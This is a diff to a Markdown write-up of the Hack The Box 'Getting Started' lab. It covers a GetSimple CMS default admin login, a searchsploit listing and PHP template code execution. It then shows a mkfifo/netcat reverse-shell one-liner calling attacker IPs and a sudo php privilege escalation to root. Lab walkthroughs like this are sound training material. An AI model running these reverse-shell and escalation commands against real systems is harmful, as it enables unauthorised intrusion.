@@ -111,11 +111,147 @@ We can see a few interesting directories, among which stand out `/admin`.
 
 ### /admin
 
-If we brose to the `/admin` directory (`http://gettingstarted.hbt/admin`) we will find a login form:
+If we browse to the `/admin` directory (`http://gettingstarted.hbt/admin`) we will find a login form:
 
-![Admin login form]("htb-getting-started-admin-login-form.png")
+![Admin login form](htb-getting-started-admin-login-form.png)
 *Admin login form*
 
-If we  try a few very basic login/password combinations we will end up hitting with `admin/admin`...
+# Foothold
+
+If we  try a few very basic login/password combinations, in the admin login form, we will end up hitting with `admin/admin`...
+
+Once we are admin, in the `Supoort`section, we can see interesting information about the `GetSimple` blog and the server setup.
+
+![Support information](htb-getting-started-support-information.png)
+*Suppor information*
+
+Now, we have the `GetSimple` version used, and we can search exploits for this version.
+
+```
+ searchsploit getsimple       
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                             |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Getsimple CMS 2.01 - 'changedata.php' Cross-Site Scripting                                                                                                                 | php/webapps/34789.html
+Getsimple CMS 2.01 - 'components.php' Cross-Site Scripting                                                                                                                 | php/webapps/34041.txt
+Getsimple CMS 2.01 - Local File Inclusion                                                                                                                                  | php/webapps/12517.txt
+Getsimple CMS 2.01 - Multiple Vulnerabilities                                                                                                                              | php/webapps/14338.html
+Getsimple CMS 2.01 < 2.02 - Administrative Credentials Disclosure                                                                                                          | php/webapps/15605.txt
+Getsimple CMS 2.03 - 'upload-ajax.php' Arbitrary File Upload                                                                                                               | php/webapps/35353.txt
+Getsimple CMS 3.0 - 'set' Local File Inclusion                                                                                                                             | php/webapps/35726.py
+Getsimple CMS 3.1.2 - 'path' Local File Inclusion                                                                                                                          | php/webapps/37587.txt
+Getsimple CMS 3.2.1 - Arbitrary File Upload                                                                                                                                | php/webapps/25405.txt
+GetSimple CMS 3.3.1 - Cross-Site Scripting                                                                                                                                 | php/webapps/43888.txt
+Getsimple CMS 3.3.1 - Persistent Cross-Site Scripting                                                                                                                      | php/webapps/32502.txt
+Getsimple CMS 3.3.10 - Arbitrary File Upload                                                                                                                               | php/webapps/40008.txt
+GetSimple CMS 3.3.13 - Cross-Site Scripting                                                                                                                                | php/webapps/44408.txt
+GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting                                                                                                                     | php/webapps/49726.py
+GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting (Authenticated)                                                                                                     | php/webapps/48850.txt
+GetSimple CMS 3.3.4 - Information Disclosure                                                                                                                               | php/webapps/49928.py
+GetSimple CMS Custom JS 0.1 - Cross-Site Request Forgery                                                                                                                   | php/webapps/49816.py
+Getsimple CMS Items Manager Plugin - 'PHP.php' Arbitrary File Upload                                                                                                       | php/webapps/37472.php
+GetSimple CMS My SMTP Contact Plugin 1.1.1 - Cross-Site Request Forgery                                                                                                    | php/webapps/49774.py
+GetSimple CMS My SMTP Contact Plugin 1.1.2 - Persistent Cross-Site Scripting                                                                                               | php/webapps/49798.py
+GetSimple CMS Plugin Multi User 1.8.2 - Cross-Site Request Forgery (Add Admin)                                                                                             | php/webapps/48745.txt
+GetSimpleCMS - Unauthenticated Remote Code Execution (Metasploit)                                                                                                          | php/remote/46880.rb
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+We can see one intersting RCE (Remote Code Execution) for metasploit that could work.
+Let's keep this in mind, put aside metasploit, and keep digging a little to try to solve the box without metasploit.
+
+Seems that we can upload files from the `Files` section, but does not work.
+
+In the `Theme` section we can edit the `template.php` file, but we can't load this page directly.
+Why? Because the code says so.
+Let's see if we can get a command execution here.
+We will comment or delete all code in `template.php` and we will edit the file appending the following php code at the beginning:
+
+```php
+<?php system('id'); ?>
+```
+
+![PHP code execution test](htb-getting-started-php-code-execution-test.png)
+*PHP code execution test*
+
+We can curl this file (`http://gettingstarted.htb/theme/Innovation/template.php`), or browse it, and we see that we have a RCE (remote code execution).
+Now, we need to take advantage of this RCE (remote code execution) to convert it in a remote shell.
+
+We will edit again the `template.php` file.
+But, this time, we will append the following bash one-liner reverse shell to the beginning:
+
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"); ?>
+```
+
+![Bash reverse shell](htb-getting-started-bash-reverse-shell.png)
+*Bash reverse shell*
+
+We need to start a netcat listener on our host (the attacker):
+
+```
+nc -lvnp 1234
+```
+
+We have to curl or browse the `template.php` (`http://gettingstarted.htb/theme/Innovation/template.php`) file, again, to execute the reverse shell.
+Now, we have a reverse shell.
+
+```
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+If we check the `/home` directory we will see that the `/home/mrb3n` is world-readable:
+
+```
+$ ls -la /home/
+total 12
+drwxr-xr-x  3 root  root  4096 Feb  9  2021 .
+drwxr-xr-x 20 root  root  4096 Feb  9  2021 ..
+drwxr-xr-x  3 mrb3n mrb3n 4096 May  7  2021 mrb3n
+```
+
+We can read our first flag directly:
+
+```
+$ cat /home/mrb3n/user.txt
+```
+
+Now, we need to escalate privileges in order to get our second flag, the `root.txt`.
+If we check our sudo privileges we will see that we can execute `/usr/bin/php` as root without password:
+
+```
+$ sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+```
+
+Since our current directory is writable, we can create a PHP file with a bash one-liner reverse shell:
+
+```
+$ echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.201 1235 >/tmp/f"); ?>' > reverse_shell.php
+```
+
+Now we need to start another netcat listener on our host (the attacker):
+
+```
+nc -lvnp 1235
+```
+
+And now, we have to execute our new file with `sudo` in order to get our root reverse shell:
+
+```
+$ sudo /usr/bin/php reverse_shell.php
+```
+
+Now we are root and we can get our last flag, the `root.txt`:
+
+```
+# cat /root/root.txt
+```
 
 *Enjoy! ;)*
